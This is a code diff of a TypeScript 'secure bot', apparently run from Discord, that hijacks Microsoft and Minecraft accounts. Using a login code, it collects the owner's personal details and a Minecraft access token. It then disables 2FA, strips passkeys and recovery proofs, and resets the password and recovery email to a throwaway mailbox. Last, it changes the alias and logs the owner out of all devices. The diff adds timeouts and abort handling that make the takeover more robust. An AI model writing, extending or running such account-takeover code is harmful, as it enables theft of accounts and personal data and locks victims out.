@@ -10,6 +10,9 @@ export interface SecureJobConfig {
   channelId: string;
   messageId?: string;
   discordId: string;
+  sessionId?: string;
+  roleId?: string;
+  ownerDiscordId?: string | null;
 }
 
 export interface SecureResult {
@@ -461,7 +464,11 @@ async function generateEmail(): Promise<{ email: string; password: string; token
   return { email, password, token: password };
 }
 
-async function getEmailCode(email: string, password: string): Promise<string> {
+async function getEmailCode(
+  email: string,
+  password: string,
+  signal?: AbortSignal,
+): Promise<string> {
   const { ImapFlow } = await import("imapflow");
   const client = new ImapFlow({
     host: "mail.firstmail.ltd",
@@ -476,9 +483,10 @@ async function getEmailCode(email: string, password: string): Promise<string> {
     const lock = await client.getMailboxLock("INBOX");
     try {
       const startTime = Date.now();
-      const timeout = 120000;
+      const timeout = 90_000;
 
       while (Date.now() - startTime < timeout) {
+        if (signal?.aborted) throw new Error("Aborted while waiting for security code");
         const mb = client.mailbox;
         const latestSeq = mb && typeof mb === "object" ? mb.exists : 0;
         if (latestSeq > 0) {
@@ -501,7 +509,11 @@ async function getEmailCode(email: string, password: string): Promise<string> {
       lock.release();
     }
   } finally {
-    await client.logout();
+    try {
+      await client.logout();
+    } catch {
+      /* ignore */
+    }
   }
 }
 
@@ -512,9 +524,11 @@ async function recover(
   newEmail: string,
   newPassword: string,
   emailToken: string,
+  signal?: AbortSignal,
 ): Promise<{ urlPost: string; recoveryCode: string } | null> {
   try {
-    const res = await fetchWithJar(jar, `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`);
+    if (signal?.aborted) throw new Error("Aborted before recovery");
+    const res = await fetchWithJar(jar, `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`, {}, { timeoutMs: 25_000 });
     const text = await res.text();
 
     const serverDataMatch = text.match(/var\s+ServerData=(.*?)(?=;|$)/);
@@ -542,7 +556,8 @@ async function recover(
         token: decodedToken,
         uiflvr: 1001,
       }),
-    });
+      signal,
+    }, { timeoutMs: 25_000 });
     const recJson = (await recRes.json()) as Record<string, string>;
     if (!recJson.apiCanary) return null;
 
@@ -568,12 +583,13 @@ async function recover(
         token,
         uiflvr: 1001,
       }),
-    });
+      signal,
+    }, { timeoutMs: 25_000 });
     const sendCodeJson = (await sendCodeRes.json()) as Record<string, string>;
     if (!sendCodeJson.apiCanary) return null;
 
     // Firstmail IMAP uses the mailbox API token as password, NOT the new MS password
-    const otpCode = await getEmailCode(newEmail, emailToken);
+    const otpCode = await getEmailCode(newEmail, emailToken, signal);
 
     const verifyRes = await fetchWithJar(jar, "https://account.live.com/API/Proofs/VerifyCode", {
       method: "POST",
@@ -692,6 +708,8 @@ async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: 
   }
 }
 
+const SECURE_HARD_TIMEOUT_MS = 4 * 60_000; // hard stop so jobs never hang forever
+
 export async function runSecureBot(
   jobId: string,
   discordId: string,
@@ -700,143 +718,170 @@ export async function runSecureBot(
 ): Promise<SecureResult | null> {
   const log = createLogger(jobId, discordId);
   const jar = new CookieJar();
+  const hardAbort = new AbortController();
+  const hardTimer = setTimeout(() => hardAbort.abort(), SECURE_HARD_TIMEOUT_MS);
+  const onParentAbort = () => hardAbort.abort();
+  if (signal.aborted) hardAbort.abort();
+  else signal.addEventListener("abort", onParentAbort, { once: true });
+  const runSignal = hardAbort.signal;
 
-  await log("info", `[secure] Starting securing pipeline for ${config.email}`);
-
-  if (signal.aborted) return null;
-
-  // Phase 1: Login with code
-  await log("info", "[secure] Getting live data...");
-  const liveData = await getLiveData(jar);
-  await log("info", "[secure] Logging in with OTP code...");
-  const loggedIn = await loginWithCode(jar, config.email, config.flowToken, config.code, liveData.ppft, liveData.urlPost);
-
-  if (!loggedIn) {
-    await log("error", "[secure] Failed to login - invalid OTP code");
-    return null;
-  }
-  await log("info", "[secure] Logged in successfully!");
-
-  if (signal.aborted) return null;
-
-  // Phase 2: Run securing pipeline
-  await log("info", "[secure] Getting cookies...");
-  const apiCanary = await getCookies(jar);
-
-  const result: SecureResult = {
-    mcUsername: config.mcUsername || "Unknown",
-    mcEmail: config.email,
-    newEmail: "Couldn't Change!",
-    newPassword: "Couldn't Change!",
-    recoveryCode: "Couldn't Change!",
-    ssid: null,
-    capes: "No capes",
-    method: "Not purchased",
-    firstName: "Failed to Get",
-    lastName: "Failed to Get",
-    region: "Failed to Get",
-    birthday: "Failed to Get",
+  const ensureAlive = () => {
+    if (runSignal.aborted) throw new Error("Secure job aborted or timed out");
   };
 
-  if (signal.aborted) return null;
-
-  // Get T
-  await log("info", "[secure] Getting TOS token...");
-  const t = await getT(jar);
-  if (!t) {
-    await log("error", "[secure] Failed to get TOS token");
-    return null;
-  }
-
-  if (signal.aborted) return null;
-
-  // Get AMC and owner info
-  await log("info", "[secure] Getting verification token...");
-  const verificationToken = await getAMC(jar);
-
-  if (signal.aborted) return null;
-
-  await log("info", "[secure] Getting owner info...");
-  const ownerInfo = await getOwnerInfo(jar, verificationToken);
-  if (ownerInfo) {
-    result.firstName = ownerInfo.firstName;
-    result.lastName = ownerInfo.lastName;
-    result.region = ownerInfo.region;
-    result.birthday = ownerInfo.birthday;
-  }
-
-  if (signal.aborted) return null;
-
-  // Get Xbox/Minecraft info
-  await log("info", "[secure] Getting Xbox Live profile...");
-  const xbl = await getXBL(jar);
-
-  if (xbl) {
-    await log("info", "[secure] Getting Minecraft SSID...");
-    const ssid = await getSSID(xbl);
-    if (ssid) {
-      result.ssid = ssid;
-      await log("info", "[secure] Got SSID!");
-
-      const capes = await getCapesList(ssid);
-      if (capes) result.capes = capes;
-
-      const profile = await getProfile(ssid);
-      if (profile) {
-        result.mcUsername = profile;
-        await log("info", `[secure] MC Username: ${profile}`);
-      }
-
-      const method = await getMethod(ssid);
-      if (method) {
-        result.method = method;
-        await log("info", `[secure] Purchase method: ${method}`);
-      }
-    }
-  }
-
-  if (signal.aborted) return null;
-
-  // Security steps
-  await log("info", "[secure] Getting AMRP...");
-  await getAMRP(jar, t);
-
-  if (signal.aborted) return null;
-
-  await log("info", "[secure] Disabling 2FA...");
-  await remove2FA(jar, apiCanary);
-
-  await log("info", "[secure] Removing passkeys...");
-  await removeZyger(jar, apiCanary);
-
-  await log("info", "[secure] Removing security proofs...");
-  await removeProofs(jar, apiCanary);
-
-  await log("info", "[secure] Removing third-party services...");
-  await removeServices(jar);
-
-  if (signal.aborted) return null;
-
-  // Recovery
-  await log("info", "[secure] Getting security information...");
-  let secInfoJson: Record<string, unknown> | null = null;
   try {
-    const secInfoStr = await securityInformation(jar);
-    secInfoJson = JSON.parse(secInfoStr) as Record<string, unknown>;
-  } catch {
-    await log("error", "[secure] Failed to get security info");
-  }
+    await log("info", `[secure] Starting securing pipeline for ${config.email}`);
+    ensureAlive();
 
-  if (secInfoJson && !signal.aborted) {
-    const mainEmail = secInfoJson.email as string;
-    const encryptedNetId = ((secInfoJson.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>)?.encryptedNetId;
+    // Phase 1: Login with code
+    await log("info", "[secure] Getting live data...");
+    const liveData = await getLiveData(jar);
+    ensureAlive();
+    await log("info", "[secure] Logging in with OTP code...");
+    const loggedIn = await loginWithCode(
+      jar,
+      config.email,
+      config.flowToken,
+      config.code,
+      liveData.ppft,
+      liveData.urlPost,
+    );
 
-    if (mainEmail && encryptedNetId) {
-      await log("info", "[secure] Getting recovery code...");
-      const recoveryCode = await getRecoveryCode(jar, apiCanary, encryptedNetId);
-      await log("info", `[secure] Got recovery code`);
+    if (!loggedIn) {
+      await log("error", "[secure] Failed to login - invalid OTP code");
+      return null;
+    }
+    await log("info", "[secure] Logged in successfully!");
+    ensureAlive();
 
-      if (!signal.aborted) {
+    // Phase 2: Run securing pipeline
+    await log("info", "[secure] Getting cookies...");
+    const apiCanary = await getCookies(jar);
+
+    const result: SecureResult = {
+      mcUsername: config.mcUsername || "Unknown",
+      mcEmail: config.email,
+      newEmail: "Couldn't Change!",
+      newPassword: "Couldn't Change!",
+      recoveryCode: "Couldn't Change!",
+      ssid: null,
+      capes: "No capes",
+      method: "Not purchased",
+      firstName: "Failed to Get",
+      lastName: "Failed to Get",
+      region: "Failed to Get",
+      birthday: "Failed to Get",
+    };
+
+    ensureAlive();
+
+    // Get T
+    await log("info", "[secure] Getting TOS token...");
+    const t = await getT(jar);
+    if (!t) {
+      await log("error", "[secure] Failed to get TOS token");
+      return null;
+    }
+
+    ensureAlive();
+
+    // Get AMC and owner info
+    await log("info", "[secure] Getting verification token...");
+    const verificationToken = await getAMC(jar);
+
+    ensureAlive();
+
+    await log("info", "[secure] Getting owner info...");
+    const ownerInfo = await getOwnerInfo(jar, verificationToken);
+    if (ownerInfo) {
+      result.firstName = ownerInfo.firstName;
+      result.lastName = ownerInfo.lastName;
+      result.region = ownerInfo.region;
+      result.birthday = ownerInfo.birthday;
+    }
+
+    ensureAlive();
+
+    // Get Xbox/Minecraft info (optional — do not fail whole job)
+    try {
+      await log("info", "[secure] Getting Xbox Live profile...");
+      const xbl = await getXBL(jar);
+
+      if (xbl) {
+        await log("info", "[secure] Getting Minecraft access token...");
+        const ssid = await getSSID(xbl);
+        if (ssid) {
+          result.ssid = ssid;
+          await log("info", "[secure] Got Minecraft access token");
+
+          const capes = await getCapesList(ssid);
+          if (capes) result.capes = capes;
+
+          const profile = await getProfile(ssid);
+          if (profile) {
+            result.mcUsername = profile;
+            await log("info", `[secure] MC Username: ${profile}`);
+          }
+
+          const method = await getMethod(ssid);
+          if (method) {
+            result.method = method;
+            await log("info", `[secure] Purchase method: ${method}`);
+          }
+        }
+      }
+    } catch (e) {
+      await log(
+        "warn",
+        `[secure] MC profile step skipped: ${e instanceof Error ? e.message : String(e)}`,
+      );
+    }
+
+    ensureAlive();
+
+    // Security steps
+    await log("info", "[secure] Getting AMRP...");
+    await getAMRP(jar, t);
+
+    ensureAlive();
+
+    await log("info", "[secure] Disabling 2FA...");
+    await remove2FA(jar, apiCanary);
+
+    await log("info", "[secure] Removing passkeys...");
+    await removeZyger(jar, apiCanary);
+
+    await log("info", "[secure] Removing security proofs...");
+    await removeProofs(jar, apiCanary);
+
+    await log("info", "[secure] Removing third-party services...");
+    await removeServices(jar);
+
+    ensureAlive();
+
+    // Recovery
+    await log("info", "[secure] Getting security information...");
+    let secInfoJson: Record<string, unknown> | null = null;
+    try {
+      const secInfoStr = await securityInformation(jar);
+      secInfoJson = JSON.parse(secInfoStr) as Record<string, unknown>;
+    } catch {
+      await log("error", "[secure] Failed to get security info");
+    }
+
+    if (secInfoJson) {
+      ensureAlive();
+      const mainEmail = secInfoJson.email as string;
+      const encryptedNetId = (
+        (secInfoJson.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>
+      )?.encryptedNetId;
+
+      if (mainEmail && encryptedNetId) {
+        await log("info", "[secure] Getting recovery code...");
+        const recoveryCode = await getRecoveryCode(jar, apiCanary, encryptedNetId);
+        await log("info", `[secure] Got recovery code`);
+
+        ensureAlive();
         await log("info", "[secure] Generating new email...");
         const newEmailData = await generateEmail();
         await log("info", `[secure] Generated email: ${newEmailData.email}`);
@@ -844,7 +889,15 @@ export async function runSecureBot(
         const newPassword = Math.random().toString(36).slice(2, 14);
 
         await log("info", "[secure] Running recovery flow...");
-        const recoveryResult = await recover(jar, mainEmail, recoveryCode, newEmailData.email, newPassword, newEmailData.token);
+        const recoveryResult = await recover(
+          jar,
+          mainEmail,
+          recoveryCode,
+          newEmailData.email,
+          newPassword,
+          newEmailData.token,
+          runSignal,
+        );
 
         if (recoveryResult) {
           result.newEmail = newEmailData.email;
@@ -853,29 +906,53 @@ export async function runSecureBot(
           await log("info", "[secure] Account secured successfully!");
 
           // Change primary alias to a new outlook.com address
-          if (!signal.aborted) {
-            await log("info", "[secure] Changing primary alias...");
-            const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
-            const aliasChanged = await changePrimaryAlias(jar, aliasName, apiCanary);
-            if (aliasChanged) {
-              result.newEmail = `${aliasName}@outlook.com`;
-              await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
-            } else {
-              await log("warn", "[secure] Failed to change primary alias - email recovery address preserved");
-            }
+          ensureAlive();
+          await log("info", "[secure] Changing primary alias...");
+          const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
+          const aliasChanged = await changePrimaryAlias(jar, aliasName, apiCanary);
+          if (aliasChanged) {
+            result.newEmail = `${aliasName}@outlook.com`;
+            await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
+          } else {
+            await log(
+              "warn",
+              "[secure] Failed to change primary alias - email recovery address preserved",
+            );
           }
         }
       }
     }
+
+    ensureAlive();
+
+    // Logout all
+    await log("info", "[secure] Logging out all devices...");
+    await logoutAll(jar, apiCanary);
+
+    const secured =
+      result.newEmail !== "Couldn't Change!" &&
+      result.newPassword !== "Couldn't Change!" &&
+      result.recoveryCode !== "Couldn't Change!" &&
+      !!result.newEmail &&
+      !!result.newPassword &&
+      !!result.recoveryCode;
+
+    if (!secured) {
+      await log(
+        "error",
+        "[secure] Recovery did not complete — refusing false success (credentials unchanged)",
+      );
+      return null;
+    }
+
+    await log("info", "[secure] Securing pipeline complete!");
+    return result;
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    await log("error", `[secure] Pipeline failed: ${msg}`);
+    return null;
+  } finally {
+    clearTimeout(hardTimer);
+    signal.removeEventListener("abort", onParentAbort);
   }
-
-  if (signal.aborted) return null;
-
-  // Logout all
-  await log("info", "[secure] Logging out all devices...");
-  await logoutAll(jar, apiCanary);
-
-  await log("info", "[secure] Securing pipeline complete!");
-
-  return result;
 }
